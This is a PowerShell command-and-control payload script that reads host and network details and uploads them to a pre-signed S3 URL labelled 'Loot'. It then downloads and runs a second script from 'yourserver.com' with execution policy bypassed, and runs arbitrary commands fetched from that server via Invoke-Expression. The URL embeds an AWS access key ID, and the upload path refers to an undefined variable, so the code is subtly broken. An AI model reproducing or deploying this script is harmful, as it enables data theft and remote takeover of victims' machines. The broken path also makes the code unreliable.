# payload.ps1
# Write a message to the local system as a log
Write-Output "Executing C2 tasks on $(hostname)" | Out-File -FilePath "C:\Users\Public\c2_log.txt" -Append

# Task 1: Gather system information
$hostname = hostname
$ipconfig = ipconfig
$systeminfo = systeminfo

# Combine information into one variable and save it to a file
$info = "Hostname: $hostname`nIP Config:`n$ipconfig`nSystem Info:`n$systeminfo"
$info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"

# Task 2: Upload the system information file to S3 using a pre-signed URL
$presignedUrl = "https://shell-raid.s3.amazonaws.com/Loot?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAXWMA6KKHPN45EZG4%2F20241030%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20241030T130459Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=90f8c842bfacf78529643bcda81e70de2e47501b6e62df43779b73c14a408ad9"  

$fileToUpload = "$programFilesFolder\sysinfo.txt"

Invoke-WebRequest -Uri $presignedUrl -Method Put -InFile $fileToUpload -ContentType "text/plain"


# Task 3: Download and execute an additional payload (e.g., payload2.ps1)
$payloadUri = "http://yourserver.com/payload2.ps1"
Invoke-WebRequest -Uri $payloadUri -OutFile "C:\Users\Public\payload2.ps1"
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File C:\Users\Public\payload2.ps1"

# Task 4: Execute additional commands or commands from C2 server
$commandUri = "http://yourserver.com/commands.txt"
$commands = Invoke-WebRequest -Uri $commandUri | Select-Object -ExpandProperty Content
Invoke-Expression $commands  # Execute commands received from the server
